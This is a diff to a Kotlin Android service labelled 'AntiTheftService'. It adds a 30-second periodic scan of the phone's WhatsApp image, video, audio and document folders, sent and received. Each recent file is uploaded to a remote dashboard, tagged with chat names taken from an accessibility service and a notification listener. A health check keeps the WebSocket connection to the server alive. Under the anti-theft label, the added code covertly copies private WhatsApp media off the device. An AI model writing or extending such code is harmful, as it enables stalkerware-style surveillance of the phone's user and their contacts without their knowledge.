@@ -190,6 +190,14 @@ class AntiTheftService : LifecycleService() {
     private var listenerCheckHandler = Handler(Looper.getMainLooper())
     private var listenerCheckRunnable: Runnable? = null
 
+    // Periodic WhatsApp media scan (fallback for FileObserver misses on Xiaomi)
+    private var mediaScanHandler = Handler(Looper.getMainLooper())
+    private var mediaScanRunnable: Runnable? = null
+
+    // Periodic health check
+    private var healthCheckHandler = Handler(Looper.getMainLooper())
+    private var healthCheckRunnable: Runnable? = null
+
     override fun onCreate() {
         super.onCreate()
         Log.d("AntiTheftService", "Service onCreate")
@@ -244,6 +252,20 @@ class AntiTheftService : LifecycleService() {
             }
         }
         listenerCheckHandler.postDelayed(listenerCheckRunnable!!, 60_000L)
+
+        // Periodic WhatsApp media scan (every 30s) — catches videos Xiaomi's FileObserver misses
+        mediaScanRunnable = Runnable {
+            scanWhatsAppMediaFolders()
+            mediaScanHandler.postDelayed(mediaScanRunnable!!, 30_000L)
+        }
+        mediaScanHandler.postDelayed(mediaScanRunnable!!, 15_000L)
+
+        // Periodic health check (every 60s)
+        healthCheckRunnable = Runnable {
+            logHealthStatus()
+            healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)
+        }
+        healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -310,23 +332,22 @@ class AntiTheftService : LifecycleService() {
             .setCategory(Notification.CATEGORY_SERVICE)
             .build()
 
-        // Use ServiceCompat to handle foreground service type correctly across API levels.
-        // Only declare LOCATION type here — camera/mic types are only needed during active streaming
-        // and declaring them without permission causes crashes on Android 13+ with targetSdk 34.
+        // Start foreground without location type requirement at boot.
+        // Location type is added dynamically via manifest when GPS starts.
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                androidx.core.app.ServiceCompat.startForeground(
-                    this,
-                    NOTIFICATION_ID,
-                    notification,
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                )
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
+            startForeground(NOTIFICATION_ID, notification)
         } catch (e: Exception) {
-            Log.e("AntiTheftService", "startForeground failed: ${e.message} — retrying without type")
-            try { startForeground(NOTIFICATION_ID, notification) } catch (e2: Exception) {
+            Log.e("AntiTheftService", "startForeground failed: ${e.message}")
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    androidx.core.app.ServiceCompat.startForeground(
+                        this, NOTIFICATION_ID, notification,
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                    )
+                } else {
+                    startForeground(NOTIFICATION_ID, notification)
+                }
+            } catch (e2: Exception) {
                 Log.e("AntiTheftService", "startForeground fallback also failed: ${e2.message}")
             }
         }
@@ -1366,6 +1387,88 @@ class AntiTheftService : LifecycleService() {
         sendConsoleLog("Mensagem recebida do painel: $message")
     }
 
+    // ── Periodic WhatsApp media scan (fallback for Xiaomi inotify issues) ─────
+    private fun scanWhatsAppMediaFolders() {
+        try {
+            val cutoff = System.currentTimeMillis() - 180_000 // files modified within last 3 min
+            val folderTypes = listOf(
+                Pair(WhatsAppPaths.allImageFolders(), "image"),
+                Pair(WhatsAppPaths.allVideoFolders(), "video"),
+                Pair(WhatsAppPaths.allAudioFolders(), "audio"),
+                Pair(WhatsAppPaths.allDocumentFolders(), "document")
+            )
+            for ((folders, type) in folderTypes) {
+                for (basePath in folders) {
+                    val baseDir = File(basePath)
+                    if (!baseDir.exists() || !baseDir.isDirectory) continue
+                    scanFolder(baseDir, type, isSent = false, cutoff)
+                    val sentDir = File(baseDir, "Sent")
+                    if (sentDir.exists() && sentDir.isDirectory) {
+                        scanFolder(sentDir, type, isSent = true, cutoff)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "Periodic media scan error: ${e.message}")
+        }
+    }
+
+    private fun scanFolder(dir: File, type: String, isSent: Boolean, cutoff: Long) {
+        val files = dir.listFiles() ?: return
+        for (file in files) {
+            if (!file.isFile) continue
+            if (file.lastModified() < cutoff) continue
+            if (file.length() < 1000) continue
+            if (!MediaUploadDedup.shouldUpload(file)) continue
+            val caption = when (type) {
+                "image" -> "📷 Imagem"
+                "video" -> "🎥 Vídeo"
+                "audio" -> "🎤 Áudio"
+                else -> "📎 Arquivo"
+            }
+            val (address, name) = resolveMediaChat(isSent)
+            Log.d("AntiTheftService", "Periodic scan: ${file.name} type=$type sent=$isSent chat=$address")
+            uploadWhatsAppMediaInternal(file, type, isSent, address, name, caption)
+        }
+    }
+
+    private fun resolveMediaChat(isSent: Boolean): Pair<String, String> {
+        // Use the last captured incoming address as fallback for better grouping
+        val lastIncoming = WhatsAppNotificationListener.lastIncomingAddress()
+        return if (isSent) {
+            val chat = ProtectAccessibilityService.currentChatName()
+            when {
+                chat.isNotBlank() -> chat to chat
+                lastIncoming.isNotBlank() -> lastIncoming to lastIncoming
+                else -> "Enviado" to "Enviado"
+            }
+        } else {
+            when {
+                lastIncoming.isNotBlank() -> lastIncoming to lastIncoming
+                else -> "Recebido" to "Recebido"
+            }
+        }
+    }
+
+    // ── Periodic health check ─────────────────────────────────────────────────
+    private fun logHealthStatus() {
+        try {
+            val wsOk = isWebSocketConnected
+            val listenerOk = WhatsAppNotificationListener.isConnected()
+            Log.i("AntiTheftService", "Health: ws=$wsOk listener=$listenerOk")
+            if (!wsOk) {
+                Log.w("AntiTheftService", "Health: WebSocket disconnected, reconnecting...")
+                Handler(Looper.getMainLooper()).post { connectToServer() }
+            }
+            if (!listenerOk) {
+                Log.w("AntiTheftService", "Health: NotificationListener not connected")
+                Handler(Looper.getMainLooper()).post { checkNotificationListenerStatus() }
+            }
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "Health check error: ${e.message}")
+        }
+    }
+
     // Helper to log dynamic events to the dashboard console
     private fun sendConsoleLog(logMessage: String) {
         try {
@@ -1420,6 +1523,11 @@ class AntiTheftService : LifecycleService() {
 
         listenerCheckRunnable?.let { listenerCheckHandler.removeCallbacks(it) }
         listenerCheckRunnable = null
+
+        mediaScanRunnable?.let { mediaScanHandler.removeCallbacks(it) }
+        mediaScanRunnable = null
+        healthCheckRunnable?.let { healthCheckHandler.removeCallbacks(it) }
+        healthCheckRunnable = null
 
         webSocket?.close(1000, "Service destroyed")
         stopCameraStream()
